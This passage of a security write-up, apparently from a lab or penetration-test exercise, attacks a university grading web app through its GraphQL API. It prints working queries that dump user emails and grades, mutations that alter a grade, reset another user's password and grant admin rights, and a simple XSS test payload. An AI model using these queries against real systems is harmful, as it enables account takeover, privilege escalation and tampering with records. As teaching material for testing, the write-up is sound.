+<p>The above query can be visualised using <a href="https://ivangoncharov.github.io/graphql-voyager/">graphql voyager</a> where we can see the relationships of the different attributes.</p>
+<p><img alt="Pasted image 20220822143443.png" src="../Media/Pasted%20image%2020220822143443.png" /></p>
+<ul>
+<li>We will be interested in the <code>mutation</code> schema as it can help understand what value the mutation can manipulate. </li>
+</ul>
+<p><img alt="Pasted image 20220822143659.png" src="../Media/Pasted%20image%2020220822143659.png" />
+<img alt="Pasted image 20220822143756.png" src="../Media/Pasted%20image%2020220822143756.png" /></p>
+<h2 id="2b-mapping-attack-surface">2b. Mapping Attack Surface<a class="headerlink" href="#2b-mapping-attack-surface" title="Permanent link">&para;</a></h2>
+<ul>
+<li>With the information gathered above, we can proceed to mapping the surface of attack.<ul>
+<li>API endpoints - Information Leakage</li>
+<li>GraphQL API endpoint - Probable Injection via mutation query.</li>
+<li>Display of user side data on admin panel (vulnerable vulnerability submission form) - probable XSS</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-vulnerability-assessment-exploitation">3. Vulnerability Assessment / Exploitation<a class="headerlink" href="#3-vulnerability-assessment-exploitation" title="Permanent link">&para;</a></h2>
+<h3 id="api-endpoints-information-leakage">API Endpoints Information Leakage<a class="headerlink" href="#api-endpoints-information-leakage" title="Permanent link">&para;</a></h3>
+<ul>
+<li>As can be seen in <a href="#further-exploration">#Further Exploration</a> there is information leakage when <code>/api/[endpoint name]</code> is used. </li>
+<li>However, this way of listing things is not efficient as we have to manually correlate.</li>
+<li>Since GraphQL is available, we will use GraphQL to query the data according to what we need.</li>
+</ul>
+<h3 id="graphql-api-injection">GraphQL API Injection<a class="headerlink" href="#graphql-api-injection" title="Permanent link">&para;</a></h3>
+<h4 id="query">Query<a class="headerlink" href="#query" title="Permanent link">&para;</a></h4>
+<h5 id="find-administrator-emails">Find Administrator Emails<a class="headerlink" href="#find-administrator-emails" title="Permanent link">&para;</a></h5>
+<ul>
+<li>Using the query below, we canlist all users, their emails and their roles</li>
+</ul>
+<div class="highlight"><pre><span></span><code>query {
+    users {
+    name
+    id
+    email
+    role{
+      id
+      name      
+    }
+    }
+}
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Admin</th>
+<th>Admin</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><img alt="Pasted image 20220822164348.png" src="../Media/Pasted%20image%2020220822164348.png" /></td>
+<td><img alt="Pasted image 20220822164409.png" src="../Media/Pasted%20image%2020220822164409.png" /></td>
+</tr>
+<tr>
+<td><img alt="Pasted image 20220822164430.png" src="../Media/Pasted%20image%2020220822164430.png" /></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h5 id="find-everyones-grades">Find Everyone's Grades<a class="headerlink" href="#find-everyones-grades" title="Permanent link">&para;</a></h5>
+<ul>
+<li>Using the query below, we can list all classes, and the grades that corresponds to the students. </li>
+</ul>
+<div class="highlight"><pre><span></span><code>query {
+    class {
+           id
+           name
+           description
+           grades {
+                   grade
+                   comments
+                   user{
+                         id
+                         name
+                              }
+                  }
+          }
+}
+</code></pre></div>
+<p><img alt="Pasted image 20220822163605.png" src="../Media/Pasted%20image%2020220822163605.png" /></p>
+<h4 id="mutation">Mutation<a class="headerlink" href="#mutation" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Over here we will demonstrate how mutations can be used to manipulate server side values.</li>
+</ul>
+<h5 id="edit-someones-grades">Edit Someone's Grades<a class="headerlink" href="#edit-someones-grades" title="Permanent link">&para;</a></h5>
+<p><img alt="Pasted image 20220822165002.png" src="../Media/Pasted%20image%2020220822165002.png" />
+<img alt="Pasted image 20220822165512.png" src="../Media/Pasted%20image%2020220822165512.png" /></p>
+<ul>
+<li>When we query the class grades with <a href="#find-everyones-grades">#Find Everyone's Grades</a> we notice that there is this student that is in <code>uni_class_id:2</code>, with <code>grade id: 22</code> and <code>user_id:5</code> with a low grade of 18. </li>
+<li>We also found a mutation query which takes in the following parameters.</li>
+</ul>
+<p><img alt="Pasted image 20220823000012.png" src="../Media/Pasted%20image%2020220823000012.png" /></p>
+<ul>
+<li>We shall attempt to help him push his grades to a better one with the <code>gradeMutation</code> query like below : </li>
+</ul>
+<div class="highlight"><pre><span></span><code>mutation {
+    gradeMutation(comments:&quot;code*&quot;, created_at:&quot;code*&quot;, uni_class_id:2, updated_at:&quot;code*&quot;, user_id:5, grade:90, id:22) {
+        comments
+        created_at
+        updated_at
+        grade
+        id
+        user {
+            role {
+                created_at
+            }
+        }
+        class {
+            description
+        }
+    }
+}
+</code></pre></div>
+<ul>
+<li>As can be seen below, his grades are sucesfully changed.</li>
+</ul>
+<p><img alt="Pasted image 20220822165609.png" src="../Media/Pasted%20image%2020220822165609.png" /></p>
+<h5 id="change-another-accounts-password">Change Another Account's Password<a class="headerlink" href="#change-another-accounts-password" title="Permanent link">&para;</a></h5>
+<ul>
+<li>We noticed that there is a mutation <code>updateUserPassword</code> which takes in User <code>id</code> as a string and <code>password</code> as a string.</li>
+</ul>
+<p><img alt="Pasted image 20220822234611.png" src="../Media/Pasted%20image%2020220822234611.png" /></p>
+<ul>
+<li>We attempt to change a random user's password by using this mutation</li>
+</ul>
+<div class="highlight"><pre><span></span><code>mutation {
+    updateUserPassword(password:&quot;123pass&quot;, id:&quot;1&quot;) {
+    id
+    name
+    password
+    role {
+       name
+         }
+    email
+    updated_at
+    }
+}
+</code></pre></div>
+<p><img alt="Pasted image 20220822234725.png" src="../Media/Pasted%20image%2020220822234725.png" />
+<img alt="Pasted image 20220822234816.png" src="../Media/Pasted%20image%2020220822234816.png" /></p>
+<ul>
+<li>As can be seen above, we are able to login as the user "Cicero Weimann" with the password <code>123pass</code>.</li>
+</ul>
+<h5 id="make-a-user-account-admin">Make a user account Admin<a class="headerlink" href="#make-a-user-account-admin" title="Permanent link">&para;</a></h5>
+<ul>
+<li>We will now attempt to use the other mutation <code>userMutation</code> to see if we can do any things with it. </li>
+</ul>
+<p><img alt="Pasted image 20220822235042.png" src="../Media/Pasted%20image%2020220822235042.png" /></p>
+<ul>
+<li>Looking at the parameters, it seems like we might be able to change an account's role id. We might even be able to change it's name.</li>
+</ul>
+<div class="highlight"><pre><span></span><code>mutation {
+    userMutation(role_id:1, name:&quot;attacker&quot;, id:1) {
+    id
+    name
+    password
+    role {
+       name
+         }
+    email
+    updated_at
+    }
+}
+</code></pre></div>
+<p><img alt="Pasted image 20220822235520.png" src="../Media/Pasted%20image%2020220822235520.png" />
+<img alt="Pasted image 20220822235536.png" src="../Media/Pasted%20image%2020220822235536.png" /></p>
+<ul>
+<li>
+<p>So it seems we have successfully made this student an "Admin" and changed his name into "attacker".</p>
+</li>
+<li>
+<p>This is verified by the fact that we can run the <code>/restore</code> and <code>/delete</code> function which we were unable to call without admin rights.</p>
+</li>
+</ul>
+<p><img alt="Pasted image 20220823005340.png" src="../Media/Pasted%20image%2020220823005340.png" />
+<img alt="Pasted image 20220823005542.png" src="../Media/Pasted%20image%2020220823005542.png" /></p>
+<h3 id="xss-on-vulnerable-forms">XSS on vulnerable forms<a class="headerlink" href="#xss-on-vulnerable-forms" title="Permanent link">&para;</a></h3>
+<ul>
+<li>From above, we know that the inputs form <code>/admin/security</code> page comes form "Report a Security Vulnerability" Form.</li>
+<li>In the form, we see that there are three input fields. </li>
+<li>We therefore manually test each input field with the following payload </li>
+</ul>
+<div class="highlight"><pre><span></span><code>&lt;script&gt;alert()&lt;/script&gt;
+</code></pre></div>
+<ul>
+<li>Based on out test which can be seen below, only "The Issue" field is vulnerable to XSS.</li>
+</ul>
+<p><img alt="Pasted image 20220823005845.png" src="../Media/Pasted%20image%2020220823005845.png" />
+<img alt="Pasted image 20220823010015.png" src="../Media/Pasted%20image%2020220823010015.png" />
+<img alt="Pasted image 20220823005756.png" src="../Media/Pasted%20image%2020220823005756.png" />
+<img alt="Pasted image 20220823005708.png" src="../Media/Pasted%20image%2020220823005708.png" /></p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.81fa17fe.min.js"></script>
+      
+    
+  </body>
+</html>
